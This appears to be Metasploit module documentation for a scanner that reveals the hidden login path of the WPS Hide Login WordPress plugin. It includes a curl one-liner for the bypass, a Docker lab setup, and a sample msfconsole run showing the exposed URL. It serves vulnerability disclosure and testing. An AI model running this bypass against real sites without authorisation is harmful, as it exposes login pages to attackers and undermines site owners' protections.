## Vulnerable Application

This module exploits a bypass issue with WPS Hide Login version <= 1.9.  WPS Hide Login
is used to make a new secret path to the login page, however a `GET` request to
`/wp-admin/options.php` with a `referer` will reveal the hidden path.

This emulates the following `curl` command: `curl --referer "something" -sIXGET http://<ip>/wp-admin/options.php`

### Wordpress Installation
To install a vulnerable version of the program create a new directory called `wordpress`.
Go inside this directory and create a file named `docker-compose.yml` with the following contents:

```
version: '3.3'

services:
   db:
     image: mysql:5.7
     volumes:
       - db_data:/var/lib/mysql
     restart: always
     environment:
       MYSQL_ROOT_PASSWORD: somewordpress
       MYSQL_DATABASE: wordpress
       MYSQL_USER: wordpress
       MYSQL_PASSWORD: wordpress

   wordpress:
     depends_on:
       - db
     image: wordpress:latest
     ports:
       - "8000:80"
     restart: always
     environment:
       WORDPRESS_DB_HOST: db:3306
       WORDPRESS_DB_USER: wordpress
       WORDPRESS_DB_PASSWORD: wordpress
       WORDPRESS_DB_NAME: wordpress
volumes:
    db_data: {}
```

Then run `sudo docker-compose up -d`. Confirm with `sudo docker ps -a` that you have
a running instance of WordPress and MySQL after this is complete. Then browse to
`http://127.0.0.1:8000` and complete WordPress setup.

### Plugin Installation
1. Go to https://downloads.wordpress.org/plugin/wps-hide-login.1.9.zip
1. Log in to WordPress
1. Go to `Plugins` and then `Add New` and click `Upload Plugin` and select the downloaded ZIP file.
1. Click `Install Now`
1. Click `Activate Plugin` on the install page confirming the install succeeded.
1. Go to `/wp-admin/plugins.php`
1. Find the WPS Hide Login plugin, click `Settings`.
1. Find the section named `Login URL` and change its value to a value of your choice.
1. Click `Save Changes`.
1. Logout. You are ready to test!

## Verification Steps

1. Install the vulnerable plugin and set a new login page
1. Start msfconsole
1. Do: `use auxiliary/scanner/http/wp_wps_hide_login_revealer`
1. Do: `set rhosts [ip]`
1. Do: `run`
1. You should find the hidden login page

## Options

## Scenarios

### WPS Hide Login version 1.9.0 on Wordpress 5.4.8 running on Ubuntu 20.04

```
resource (hide_login.rb)> use auxiliary/scanner/http/wp_wps_hide_login_revealer
resource (hide_login.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (hide_login.rb)> set verbose true
verbose => true
resource (hide_login.rb)> run
[*] Checking /wp-content/plugins/wps-hide-login/readme.txt
[*] Found version 1.9 in the plugin
[+] 1.1.1.1 - Vulnerable version of wps_hide_login detected
[*] 1.1.1.1 - Determining login page
[+] Login Page: http://1.1.1.1/supersecret/?redirect_to=%2Fwp-admin%2FilOYZU&reauth=1
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
